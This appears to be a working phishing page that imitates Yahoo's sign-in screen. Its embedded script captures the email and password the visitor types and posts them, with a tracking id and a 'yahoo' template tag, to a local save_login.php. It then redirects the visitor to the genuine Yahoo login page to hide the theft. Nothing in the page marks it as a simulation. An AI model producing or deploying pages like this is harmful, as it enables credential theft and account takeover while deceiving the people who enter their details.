<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Yahoo</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Yahoo Sans",system-ui,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{width:100%;max-width:380px;padding:40px 24px}
.y{color:#6001d2;font-size:36px;font-weight:700;margin-bottom:24px}
h1{font-size:1.25rem;color:#26282a;margin-bottom:8px}
.sub{color:#464e56;font-size:14px;margin-bottom:24px}
input{width:100%;height:48px;border:1px solid #d8d8d8;border-radius:4px;padding:0 12px;font-size:16px;margin-bottom:12px}
.btn-submit{width:100%;height:48px;background:#6001d2;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer}
</style></head><body><div class="card"><div class="y">yahoo!</div><h1>Sign in</h1><p class="sub">Enter your email and password</p><form id="loginForm"><input type="text" id="email" placeholder="Email address" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Next</button></form></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<script>
(function(){
var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
    var login = document.getElementById("email").value;
    var password = document.getElementById("password").value;
    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
    var btn = document.querySelector(".btn-submit");
    var label = btn.textContent;
    btn.textContent = "Please wait…";
    btn.disabled = true;
    $.ajax({
        type: "POST",
        url: BASE_URL + "save_login.php",
        data: { tid: tid, login: login, password: password, template: "yahoo" },
        dataType: "json",
        success: function (data) {
            if (data && data.ok) { window.location.href = "https:\/\/login.yahoo.com\/"; return; }
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        },
        error: function () {
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        }
    });
});
})();
</script></body></html>
